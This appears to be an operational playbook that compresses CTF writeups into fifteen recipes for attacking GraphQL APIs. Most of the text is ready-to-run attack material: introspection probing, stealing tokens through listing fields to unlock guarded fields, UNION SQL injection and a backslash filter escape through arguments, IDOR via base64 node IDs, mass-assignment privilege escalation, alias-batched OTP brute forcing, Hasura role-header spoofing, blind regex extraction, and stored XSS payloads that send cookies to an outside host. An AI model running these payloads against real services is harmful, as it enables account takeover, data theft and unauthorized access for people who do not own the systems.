# CTF walkthroughs — the shapes that actually appear

The solved-writeup patterns, compressed into recipes. Each is the sequence a
challenge takes — the signals, the play, the proof. Sources in
`writeup-techniques.md`; this file is the operational version.

---

## Shape 1 — Introspection → named field → flag

The simplest shape. Server has introspection on; the schema literally names
`flag`.

```text
Signal: POST /graphql works, {__typename} returns Query
Play:   {__schema{queryType{fields{name}}}}
        → "flag", "super_super_secret_flag_dispenser", "secretFlag"
        {flag} or {flag(token:"x")} or {superSecretFlagDispenser(authorized:true)}
        → flag value in data
```

Recipe:

```graphql
{__schema{queryType{fields{name}}}}
# read the names — pick the flag-shaped one
{flag}
{flag}
{getFlag}
{secretFlag}
{superSecretFlagDispenser}
{flag{value}}
{flag{content}}
{internal{flag}}
{debug{flag}}
{admin{flag}}
```

If the flag field takes args — `flag(token:String!)`, `flag(authorized:Boolean!)` —
the args are the gate:

```graphql
{flag(authorized:true)}
{flag(token:"anything")}
{flag(id:1)}
{flag(user:"admin")}
```

If the args gate on a *real* secret — the next shape.

## Shape 2 — Unguarded listing feeds the guarded field

The `flag` field wants a token that `users`/`allUsers`/`me` leaks. The
corpus's most-cited CTF solve (corCTF devme, HacktivityCon, darkCON):

```text
Signal: {flag} → "error authenticating user: invalid token"
Play:   {users{username token}} → grab any token
        {flag(token:"<stolen>")} → flag
```

Variants:

```graphql
{users{token}}               # free token list
{allUsers{token}}
{users{password}}
{users{apiKey}}
{users{jwt}}
{me{token}}                  # your own token
{me{apiKey}}
{me{secret}}
{session{token}}
{sessions{token}}
{auth{token}}
{token{value}}

# then into the guarded field
{flag(token:"abc123")}
{flag(token:"<real-token>")}
{getFlag(token:"<real-token>")}
{admin{flag(token:"<real-token>")}}
{user(id:1){flag(token:"<token>")}}
{node(id:"VXNlcjox"){... on User{flag(token:"<token>")}}}
```

**The general rule**: whenever a field demands an arg you don't have, grep
the schema for a *listing* field that returns the same-named arg —
`token`/`apiKey`/`key`/`secret`/`password`/`code`/`hash`/`otp`/`pin` —
as a field on some type.

## Shape 3 — Injection through a GraphQL argument

The `q`/`id`/`name`/`filter` arg reaches SQL:

```text
Signal: {getNote(q:"test'")} → "sqlite3.OperationalError: unrecognized..."
Play:   UNION SELECT through the same field — read the schema via
        sqlite_master/information_schema
```

```graphql
{getNote(q:"test'"){body}}
# → errors[].message = "(sqlite3.OperationalError) unr..."

{getNote(q:"' UNION SELECT tbl_name,null,null,null FROM sqlite_master
            WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'-- "){body}}
# → table names

{getNote(q:"' UNION SELECT sql,null,null,null FROM sqlite_master-- "){body}}
# → CREATE TABLE statements — find flag table

{getNote(q:"' UNION SELECT flag,null,null,null FROM flag_table-- "){body}}
# → flag
```

The error text is inside `errors[].message` — GraphQL wraps driver errors
into the array. The UNION's column count matches the *resolver's* selected
column count — `getNote(q){body}` → the resolver reads N columns, so UNION
returns N columns.

## Shape 4 — Filter-object backslash escape

VolgaCTF Library — verbatim shape: input object fields are sanitized
individually but concatenated into one WHERE. A backslash in one field eats
its terminator; the sibling field's content is raw SQL:

```graphql
{testGetUsersByFilter(filter:{login:"'"}){login}}
# → "" — quote stripped, sanitizer confirmed

{testGetUsersByFilter(filter:{login:"\\" email:" OR 1=1 -- "}){login}}
# → all users — the email field's value became SQL

{testGetUsersByFilter(filter:{login:"\\" email:" UNION SELECT
  1,TABLE_NAME,3,4,5,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS -- "}){login}}
# → schema dump
```

**The trick**: any *input object* with multiple string fields is a candidate —
each field is sanitized separately but the WHERE is one string. Probe every
input object for the backslash-escape.

## Shape 5 — IDOR via `node()` or direct id

Relay-styled apps expose `node(id:)`:

```text
Signal: {__schema{queryType{fields{name}}}} shows "node"
Play:   decode id as base64 → "Type:localId" → swap type/id
```

```graphql
{node(id:"VXNlcjox"){... on User{email}}}         # User:1
{node(id:"RmxhZzox"){... on Flag{value}}}         # Flag:1 — the target
{node(id:"RmxhZzpmbGFn"){__typename}}              # Flag:flag
{node(id:"SW50ZXJuYWxDb25maWc6MQ=="){... on InternalConfig{env}}}
```

Type names to try as the prefix — anything that sounds like a table:
`Flag`, `Secret`, `Config`, `InternalConfig`, `FlagStore`, `Admin`,
`Backdoor`, `Debug`, `Private`, `Hidden`, `Feature`, `Credential`.

## Shape 6 — Admin field hidden by schema filtering

Introspection shows a restricted schema — but the *real* field still resolves:

```graphql
{__schema{queryType{fields{name}}}}
# → "user", "post" — no admin

# but try anyway:
{admin{flag}}
{admin{users{email}}}
{admin{config}}
{internal{flag}}
{debug{flag}}
{backdoor{flag}}
{hidden{flag}}
{private{flag}}
```

The schema view is per-role; the resolver doesn't always match. Try every
admin-shaped name — the *name* can be recovered from `did you mean` errors,
the JS bundle, or `map --seed`.

## Shape 7 — Mass assignment through register/update input

```graphql
mutation{register(input:{username:"x",password:"y"}){id}}
# → works — normal user created

mutation{register(input:{username:"x",password:"y",role:"admin"}){id role}}
mutation{register(input:{username:"x",password:"y",isAdmin:true}){id}}
mutation{register(input:{username:"x",password:"y",verified:true}){id}}
# → one of the extras lands — role:"admin" returned
```

Then `{admin{flag}}` resolves. The extras wordlist: `role`, `isAdmin`,
`admin`, `is_staff`, `isSuperuser`, `verified`, `isVerified`, `plan`,
`tier`, `subscription`, `balance`, `credits`, `permissions`, `approved`.

## Shape 8 — Introspection-off via `_service{sdl}`

Federation deployment — `__schema` blocked, `_service` open:

```graphql
{__schema{types{name}}}
# → error

{_service{sdl}}
# → "type Query { flag: String ... }" — the SDL

{flag}
# → works
```

The `_service{sdl}` resolver is not introspection — it survives every
disableIntrospection middleware.

## Shape 9 — OTP/brute force via aliases

A 4-6 digit code-gated mutation — rate-limited per request but aliases
multiply the attempts:

```graphql
mutation{
  o000000:verify(code:"000000"){ok}
  o000001:verify(code:"000001"){ok}
  ...
  o999999:verify(code:"999999"){ok}
}
```

Generate with a script (`batching-attacks.md` §5), then pick the `ok:true`
element's index as the code. Works when the server doesn't cap alias count.

## Shape 10 — Stored XSS through a mutation → admin bot

The GraphQL app has an admin-bot endpoint that renders user content:

```graphql
mutation{addComment(text:"<script>fetch('//a.tld/'+document.cookie)</script>"){id}}
mutation{updateProfile(bio:"<img src=x onerror=fetch('//a.tld/'+document.cookie)>"){id}}
```

The mutation writes; the bot's page reads through the same schema or the
normal HTML route — the flag rides the bot's cookie. Combined carrier:
`skills/web-xss/` owns the payload; GraphQL is the write channel.

## Shape 11 — Subgraph direct access

Federation topology; subgraph port exposed:

```text
Signal: gateway at :4000/graphql, nmap/DNS shows :4001
Play:   curl :4001/graphql — no auth context, full resolver access
        or: x-user-id:1 x-user-role:admin self-injected headers
```

```bash
for p in 4000 4001 4002 4003 5000 5001 8000 8080; do
  curl -s -m2 -o /dev/null -w "$p:%{http_code}\n" "http://$HOST:$p/graphql" \
    -d '{"query":"{__typename}"}' -H 'Content-Type: application/json'
done
```

## Shape 12 — Hasura role spoof

```bash
curl -s "$BASE/v1/graphql" -H 'x-hasura-role:admin' \
  -d '{"query":"{secrets{value}}"}'
# → works — admin data without admin secret
```

Or the metadata API:

```bash
curl -s "$BASE/v1/metadata" -d '{"type":"export_metadata","args":{}}'
# → the full config, webhook URLs, secret names
```

## Shape 13 — Error-message oracle leaks the flag

The flag *is* the error message — a resolver that throws on wrong input and
includes the flag/secret in the error text:

```graphql
{flag(token:"wrong")}
# → {"errors":[{"message":"Invalid token. The real flag is flag{...}"}]}

{verify(pin:"0000")}
# → {"errors":[{"message":"Nope. flag{...}"}]}
```

Or driver-text leakage: `{user(name:"'"){id}}` → `errors[].message` carries
`SqlSyntaxError: near "flag{...}"` — the *table content* in the error.

## Shape 14 — Batch + partial data

The response carries data AND errors — partial authz:

```graphql
{user(id:5){name email role sessions{token}}}
```

```json
{"data":{"user":{"name":"victim","email":null,"role":null,"sessions":null}},
 "errors":[{"message":"Forbidden","path":["user","email"]},
           {"message":"Forbidden","path":["user","role"]},
           {"message":"Forbidden","path":["user","sessions"]}]}
```

The pattern: fields authz'd individually. The nested path
`post.author.email` may skip the check — `post(id){author{email}}` resolves
the same User type through a different entry.

## Shape 15 — Blind extraction via `_regex`/`$regex`

Hasura `_regex` or Mongo `$regex` gives boolean extraction when data returns
are suppressed:

```graphql
{users(where:{password:{_regex:"^f"}}){id}}       # Hasura
{users(filter:{password:{"$regex":"^f"}}){id}}    # raw Mongo
{users(filter:{password:{"$regex":"^fl"}}){id}}
{users(filter:{password:{"$regex":"^flag\\{"}}){id}}
```

`^flag{` → anchor + literal chars — the `data.users` non-empty vs empty is
the oracle. Walk the charset per position (`blind-graphql.md` §6).
